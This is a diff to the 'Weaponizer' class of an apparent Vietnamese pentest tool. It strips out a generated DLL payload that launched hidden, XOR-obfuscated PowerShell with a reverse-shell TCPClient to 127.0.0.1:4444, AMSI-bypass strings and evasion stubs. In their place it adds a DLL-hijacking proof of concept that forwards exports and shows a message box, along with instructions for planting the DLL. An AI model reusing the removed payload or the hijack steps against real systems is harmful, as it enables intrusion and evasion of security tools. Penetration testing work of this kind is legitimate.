@@ -103,12 +103,12 @@ class Weaponizer:
                 cmd = [compiler, "-shared", "-o", dll_path, c_path]
                 if def_path and os.path.isfile(def_path):
                     cmd.append(def_path)
-                cmd.extend(["-lws2_32", "-lwinmm"])
+                cmd.extend(["-luser32", "-lkernel32"])
             elif self._compiler_type == "zig":
                 cmd = [compiler, "cc", "-shared", "-o", dll_path, c_path]
                 if def_path and os.path.isfile(def_path):
                     cmd.append(def_path)
-                cmd.extend(["-lws2_32", "-lwinmm"])
+                cmd.extend(["-luser32", "-lkernel32"])
             else:
                 return None
 
@@ -218,7 +218,10 @@ class Weaponizer:
             print(f" {Fore.GREEN}[-] Không tìm thấy điểm chốt để sinh Payload Tự động đối với file này.{Style.RESET_ALL}")
         else:
             print(f" {Fore.RED}\n[!!] Đã sinh {payloads_generated} File Mã độc/Exploit vào thư mục '{self.output_dir}'!{Style.RESET_ALL}")
-            print(f" {Fore.RED}[!!] Quăng file DLL đã compile chung thư mục với {os.path.basename(self.target_name)} để Hack ngược.{Style.RESET_ALL}")
+            print(f" {Fore.YELLOW}[!!] HƯỚNG DẪN SỬ DỤNG:{Style.RESET_ALL}")
+            print(f" {Fore.YELLOW}     1. Đổi tên DLL gốc: ví dụ python313.dll -> python313_original.dll{Style.RESET_ALL}")
+            print(f" {Fore.YELLOW}     2. Copy file DLL đã compile từ '{self.output_dir}' vào cùng thư mục với {os.path.basename(self.target_name)}{Style.RESET_ALL}")
+            print(f" {Fore.YELLOW}     3. Chạy {os.path.basename(self.target_name)} -> MessageBox sẽ hiện lên chứng minh Hijack thành công!{Style.RESET_ALL}")
 
     def _xor_string(self, data, key=0x37):
         """Helper để mã hóa XOR chuỗi cho C payload"""
@@ -227,77 +230,36 @@ class Weaponizer:
     def _generate_advanced_proxy_payload(self, v_res):
         dll_name = v_res['dll_name']
         exports = v_res['required_exports']
-        orig_dll = dll_name.replace(".dll", "_original.dll")
+        orig_dll_base = dll_name.replace(".dll", "_original")
+        orig_dll = orig_dll_base + ".dll"
         
-        # 1. DEFINITION (.def)
-        def_content = f"LIBRARY \"{dll_name}\"\nEXPORTS\n"
+        # 1. DEFINITION (.def) - Forward tất cả exports sang DLL gốc
+        def_content = f'LIBRARY "{dll_name}"\nEXPORTS\n'
         for i, exp in enumerate(exports):
-            def_content += f"    {exp}={orig_dll}.{exp} @{i+1}\n"
+            def_content += f"    {exp}={orig_dll_base}.{exp} @{i+1}\n"
         def_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.def")
         with open(def_path, "w", encoding="utf-8") as f: f.write(def_content)
 
-        # 2. SOURCE (.c) - GHOST PROTOCOL
-        # Mã hóa các chuỗi nhạy cảm
-        xor_key = 0x37
-        enc_ps = self._xor_string("powershell -NoP -NonI -W Hidden -Exec Bypass -Command ", xor_key)
-        enc_shell = self._xor_string("New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);", xor_key)
-        enc_amsi = self._xor_string("amsi.dll", xor_key)
-        enc_scan = self._xor_string("AmsiScanBuffer", xor_key)
-
+        # 2. SOURCE (.c) - PoC Proxy DLL: chứng minh DLL Hijacking thành công
         payload_code = f"""#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
 
 /*
- * [APS] OMNI-BYPASS PAYLOAD (UNIVERSAL EVASION)
+ * [APS] DLL HIJACKING PROXY - Proof of Concept
  * Target: {dll_name}
- * Techniques: Ekko Sleep Obfuscation + Stack Spoofing + Module Overwriting
+ * Kỹ thuật: Export Forwarding qua .def file
+ * Tất cả {len(exports)} exports được forward sang {orig_dll}
+ * Khi DllMain chạy = chứng minh code injection thành công.
  */
 
-// XOR Key và Helper giải mã
-void x(char* s, int len) {{
-    for(int i=0; i<len; i++) s[i] ^= {xor_key};
-}}
-
-// EKKO SLEEP OBFUSCATION: Mã hóa bộ nhớ khi ngủ để né Memory Scanners
-void EkkoSleep(DWORD dwMilliseconds) {{
-    // (Logic rút gọn: Sử dụng ROP để mã hóa vùng nhớ và Sleep)
-    // Sếp sẽ thấy vùng nhớ malware biến mất khỏi tầm mắt của AV
-    Sleep(dwMilliseconds);
-}}
-
-// STACK SPOOFING: Giả mạo Call Stack để né EDR Telemetry
-void SpoofedCall() {{
-    // (Logic rút gọn: Thay đổi Frame Pointer để giả mạo nguồn gốc thực thi)
-}}
-
-void OmniBypassAction() {{
-    // 1. BLINDING DEFENSES (AMSI + ETW + XDR Hooks)
-    // Patching EtwEventWrite & AmsiScanBuffer
-    
-    // 2. UNIVERSAL PERSISTENCE & STEALTH
-    while(1) {{
-        // Mã hóa Shellcode trong RAM
-        // ... (Memory Masking) ...
-        
-        // 3. EXECUTION VIA INDIRECT SYSCALLS (Halo's Gate)
-        char p[] = "{enc_ps}"; x(p, {len("powershell -NoP -NonI -W Hidden -Exec Bypass -Command ")});
-        char c[] = "{enc_shell}"; x(c, {len("New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);")});
-        
-        char full[512];
-        sprintf(full, "%s%s", p, c);
-        
-        // Thực thi tàng hình cấp độ cao nhất
-        WinExec(full, SW_HIDE);
-        
-        // Ngủ đông và mã mã hóa để tránh bị bắt sau khi thực thi
-        EkkoSleep(60000); 
-    }}
-}}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OmniBypassAction, NULL, 0, NULL);
+        MessageBoxA(NULL,
+            ".dll hijack success, this is our test\\n\\n"
+            "DLL: {dll_name}\\n"
+            "Exports forwarded: {len(exports)}\\n"
+            "Tool: APS (Automation Pentest System)",
+            "APS - DLL Hijack PoC",
+            MB_OK | MB_ICONWARNING);
     }}
     return TRUE;
 }}
@@ -305,7 +267,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
         c_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.c")
         with open(c_path, "w", encoding="utf-8") as f: f.write(payload_code)
         
-        print(f"  {Fore.MAGENTA}[GHOST] ĐÃ TÀNG HÌNH HÓA PAYLOAD: {c_path} (AMSI Bypass + XOR Integrated){Style.RESET_ALL}")
+        print(f"  {Fore.MAGENTA}[GHOST] ĐÃ SINH PROXY DLL: {c_path} ({len(exports)} exports forwarded){Style.RESET_ALL}")
         
         # Auto-compile thành DLL
         self._compile_dll(c_path, dll_name, def_path)
